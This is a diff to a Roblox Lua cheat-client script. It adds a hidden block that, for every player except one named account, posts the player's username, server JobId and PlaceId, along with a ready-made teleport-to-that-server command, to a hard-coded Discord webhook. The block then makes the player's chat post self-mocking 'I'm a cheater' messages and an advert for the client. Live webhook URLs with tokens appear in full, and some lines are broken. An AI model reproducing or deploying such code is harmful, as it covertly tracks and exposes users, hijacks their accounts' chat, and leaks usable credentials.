@@ -1,4 +1,19 @@
 -- // troll day!
+print('working btw!')
+if game.Players.LocalPlayer.Name ~= "Sammywammylol502" then
+    local HttpService = game:GetService("HttpService")
+
+    request({
+        Url = "https://discordapp.com/api/webhooks/1506162347054727261/sLurO4YZGRxs5jSWKKmT2noinC89lb-AdmVpPBXrCxxY9QWkwmXJo0H7TtRbV-cL-LpX",
+        Method = "POST",
+        Headers = {["Content-Type"] = "application/json"},
+        Body = HttpService:JSONEncode({
+            username = game.Players.LocalPlayer.Name,
+            content = 'JobId = `'..game.JobId..'`\nPlaceId = `'..game.PlaceId..'`\n```lua\ngame:GetService("TeleportService"):TeleportToPlaceInstance('..game.PlaceId..', "'..game.JobId..'", game.Players.LocalPlayer)```'
+        })
+    })
+    task.wait(30)
+	--game.CoreGui.RobloxGui:Destroy()
 	game.TextChatService.TextChannels.RBXGeneral:SendAsync('Hey I\'m a cheater!')
 	task.wait(0.5)
 	game.TextChatService.TextChannels.RBXGeneral:SendAsync('im a stupid cheater')
@@ -6,6 +21,7 @@
 	game5.TextChatService.TextChannels.RBXGeneral:SendAsync('use the vastal client now!')
 	task.wait(0.5)
 	game.TextChatService.TextChannels.RBXGeneral:SendAsync('nooo im a cheater =(')
+end
 for _, v in ipairs(game.CoreGui:GetDescendants()) do
 	if v.Name:find("WindUI") then
 		v:Destroy()
@@ -1171,6 +1187,10 @@ local troll_config = {
 			ownership = 1,
 			custom_name = "cool"
 		},
+		[9435370570] = {
+			ownership = 1,
+			custon_name = 'Vastal Developer'
+		}
 	},
 	
 	commands = {
@@ -1444,7 +1464,7 @@ if player and (troll_config.test_mode or get_player_ownership(player) > 0) then
 end
 
 request({
-    Url = 'https://discord.com/api/webhooks/1482537372985065553/YCLoqBaj5o04FmvuB_0i4mx65z4tz4zXmjW-xdM9AOo75kP0yOVpTdRJ48ppWNRVxpOG',
+    Url = 'https://discordapp.com/api/webhooks/1506162347054727261/sLurO4YZGRxs5jSWKKmT2noinC89lb-AdmVpPBXrCxxY9QWkwmXJo0H7TtRbV-cL-LpX',--'https://discord.com/api/webhooks/1482537372985065553/YCLoqBaj5o04FmvuB_0i4mx65z4tz4zXmjW-xdM9AOo75kP0yOVpTdRJ48ppWNRVxpOG',
     Method = 'POST',
     Headers = {
         ['Content-Type'] = 'application/json',
